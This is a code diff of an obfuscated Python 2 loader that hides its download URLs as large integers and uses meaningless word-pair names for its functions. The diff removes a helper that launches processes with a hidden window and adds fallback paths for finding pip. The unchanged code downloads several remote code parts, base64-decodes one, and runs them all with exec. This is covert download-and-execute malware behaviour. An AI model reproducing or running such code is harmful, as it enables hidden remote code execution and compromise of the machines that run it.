@@ -79,13 +79,6 @@ def main(*args, **kwargs):
             vector  = block
             result.append(output)
         return ''.join(result).rstrip("\x00")
-
-    def BouncyNaturalBreasts(path, shell=True):
-        info = subprocess.STARTUPINFO()
-        info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
-        info.wShowWindow = subprocess.SW_HIDE
-        p = subprocess.Popen(path, startupinfo=info, shell=shell)
-        return p
         
     def CrystallineSluggishAnatomy(*args, **kwargs):
         IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
@@ -96,6 +89,14 @@ def main(*args, **kwargs):
         AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
         GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
         if not len(GroovySophisticatedLemur):
+            if os.name is 'nt':
+                if os.path.exists('/Python27/Scripts/pip.exe'):
+                    GroovySophisticatedLemur = '/Python27/Scripts/pip.exe' 
+            else:
+                if os.path.exists('/usr/bin/pip'):
+                    GroovySophisticatedLemur = '/usr/bin/pip'
+                elif os.path.exists('/usr/local/bin/pip'):
+                    GroovySophisticatedLemur = '/usr/local/bin/pip'
             exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
             return SomberUnbecomingAmusement(AccidentalAquaticCat.get('l'))
         else:
@@ -137,7 +138,7 @@ def main(*args, **kwargs):
                                     SeamlessGalacticSponges('Install error: {}'.format(str(e)))
             except Exception as e:
                 if __DEBUG__:
-                    print("Load error: {}".format(str(e)))
+                    print("Launch error: {}".format(str(e)))
             return AccidentalAquaticCat                
                 
     s = 'tasklist' if os.name is 'nt' else 'ps'
@@ -152,7 +153,7 @@ def main(*args, **kwargs):
         SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
         if 'z' in AccidentalAquaticCat:
             head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
-            head = head + "\n\nif __name__ == '__main__':\n\tglobal ___kwarg___\n\t___kwarg___ = {}\n\tmain(**___kwarg___)".format(json.dumps(AccidentalAquaticCat))
+            head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
             foot = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()
             foot = base64.b64decode(foot)
             body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
@@ -160,7 +161,7 @@ def main(*args, **kwargs):
             pkgs = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
         else:
             head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
-            head = head + "\n\nif __name__ == '__main__':\n\tglobal ___kwarg___\n\t___kwarg___ = {}\n\tmain(**___kwarg___)".format(json.dumps(AccidentalAquaticCat))
+            head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
             body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
             pkgs = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
         exec '\n\n\n'.join([pkgs, body, head]) in globals()
